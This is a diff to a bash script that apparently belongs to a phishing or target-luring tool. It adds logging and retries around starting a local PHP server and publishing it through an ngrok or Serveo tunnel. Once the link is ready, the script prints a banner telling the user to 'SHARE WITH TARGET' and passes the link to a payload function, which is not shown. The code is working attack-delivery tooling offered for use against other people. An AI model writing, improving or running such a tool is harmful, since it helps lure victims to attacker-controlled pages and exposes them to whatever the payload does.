@@ -279,26 +279,44 @@ try_ngrok() {
 	fi
 
 	# Start ngrok
+	printf "\e[1;92m[+] Starting ngrok http 3333...\e[0m\n"
 	$NGROK_CMD http 3333 > ngrok.log 2>&1 &
 	local ngrok_pid=$!
+	printf "\e[1;92m[+] ngrok PID: $ngrok_pid\e[0m\n"
+	
+	# Give ngrok time to start
+	sleep 3
 	
 	# Wait for tunnel and poll API
-	printf "\e[1;92m[+] Polling ngrok API...\e[0m\n"
+	printf "\e[1;92m[+] Polling ngrok API (http://127.0.0.1:4040/api/tunnels)...\e[0m\n"
 	local link=""
 	local attempts=0
 	
-	until [[ -n "$link" || $attempts -ge 40 ]]; do
+	until [[ -n "$link" || $attempts -ge 50 ]]; do
 		sleep 1
-		api_json=$(curl -s --max-time 1 http://127.0.0.1:4040/api/tunnels 2>/dev/null || true)
-		if [[ -n "$api_json" ]]; then
-			link=$(echo "$api_json" | grep -o '"public_url":"https://[^"]*' | head -n1 | cut -d'"' -f4 || true)
-			if [[ -z "$link" ]]; then
-				link=$(echo "$api_json" | grep -o 'https://[^/]*' | head -n1 || true)
+		
+		# Try API first
+		if has_cmd curl; then
+			api_json=$(curl -s --connect-timeout 1 --max-time 2 http://127.0.0.1:4040/api/tunnels 2>/dev/null || true)
+			if [[ -n "$api_json" ]]; then
+				printf "\e[1;92m[DEBUG] API response received\e[0m\n"
+				link=$(echo "$api_json" | grep -o '"public_url":"https://[^"]*' | head -n1 | cut -d'"' -f4 || true)
+				if [[ -z "$link" ]]; then
+					link=$(echo "$api_json" | grep -o 'https://[^/]*' | head -n1 || true)
+				fi
 			fi
 		fi
-		if [[ -f ngrok.log ]]; then
+		
+		# Fallback: grep ngrok.log
+		if [[ -z "$link" ]] && [[ -f ngrok.log ]]; then
 			link=$(grep -o 'https://[A-Za-z0-9.-]*ngrok[^ ]*' ngrok.log | head -n1 || true)
 		fi
+		
+		# Show progress every 10 attempts
+		if (( attempts % 10 == 0 )); then
+			printf "\e[1;92m[+] Waiting for ngrok... (%d/50 attempts)\e[0m\n" "$attempts"
+		fi
+		
 		attempts=$((attempts+1))
 	done
 
@@ -307,8 +325,11 @@ try_ngrok() {
 		echo "$link"
 		return 0
 	else
-		printf "\e[1;93m[!] ngrok failed (see ngrok.log)\e[0m\n"
+		printf "\e[1;93m[!] ngrok timeout or failed\e[0m\n"
+		printf "\e[1;93m[DEBUG] ngrok.log contents:\e[0m\n"
+		head -50 ngrok.log || true
 		kill $ngrok_pid 2>/dev/null || true
+		sleep 1
 		return 1
 	fi
 }
@@ -399,8 +420,12 @@ main() {
 	printf "\n\e[1;92m[*] Auto-setup mode\e[0m\n"
 
 	# Kill any existing services
+	printf "\e[1;92m[+] Cleaning up old processes...\e[0m\n"
 	kill_port 3333
 	kill_port 4040
+	pkill -f -2 ngrok > /dev/null 2>&1 || true
+	pkill -f -2 php > /dev/null 2>&1 || true
+	sleep 1
 
 	# Setup ngrok (auto-download)
 	if ! setup_ngrok; then
@@ -421,19 +446,46 @@ main() {
 	fi
 
 	printf "\e[1;92m[+] Starting PHP server on $PHP_BIND:3333\e[0m\n"
+	
+	# Start PHP server and capture output
 	php -S ${PHP_BIND}:3333 > php.log 2>&1 &
+	local php_pid=$!
+	printf "\e[1;92m[+] PHP PID: $php_pid\e[0m\n"
+	
+	# Verify PHP started
 	sleep 2
+	if ! kill -0 $php_pid 2>/dev/null; then
+		printf "\e[1;31m[!] PHP failed to start\e[0m\n"
+		printf "\e[1;93m[DEBUG] php.log:\e[0m\n"
+		cat php.log || true
+		stop
+	fi
+	
+	printf "\e[1;92m[✓] PHP server running (PID: $php_pid)\e[0m\n"
 
 	# Try ngrok first, then Serveo
+	printf "\n\e[1;92m[*] Obtaining public link...\e[0m\n"
 	local link=""
 	link=$(try_ngrok) || link=$(try_serveo)
 
 	if [[ -z "$link" ]]; then
 		printf "\e[1;31m[!] All tunneling methods failed\e[0m\n"
+		printf "\e[1;93m[!] Possible reasons:\e[0m\n"
+		printf "  - No internet connection\n"
+		printf "  - Firewall blocking\n"
+		printf "  - ngrok authtoken invalid\n"
+		printf "  - Serveo service down\n"
 		stop
 	fi
 
-	printf "\e[1;92m[✓] Public link:\e[0m\e[1;77m %s\e[0m\n" "$link"
+	printf "\n"
+	printf "\e[1;92m╔════════════════════════════════════════════════════════════╗\e[0m\n"
+	printf "\e[1;92m║\e[0m\e[1;77m              PUBLIC LINK READY - SHARE WITH TARGET       \e[0m\e[1;92m║\e[0m\n"
+	printf "\e[1;92m║\e[0m                                                            \e[1;92m║\e[0m\n"
+	printf "\e[1;92m║\e[0m\e[1;77m  %s\e[0m  \e[1;92m║\e[0m\n" "$link"
+	printf "\e[1;92m║\e[0m                                                            \e[1;92m║\e[0m\n"
+	printf "\e[1;92m╚════════════════════════════════════════════════════════════╝\e[0m\n"
+	printf "\n"
 
 	# Setup payload
 	payload "$link"
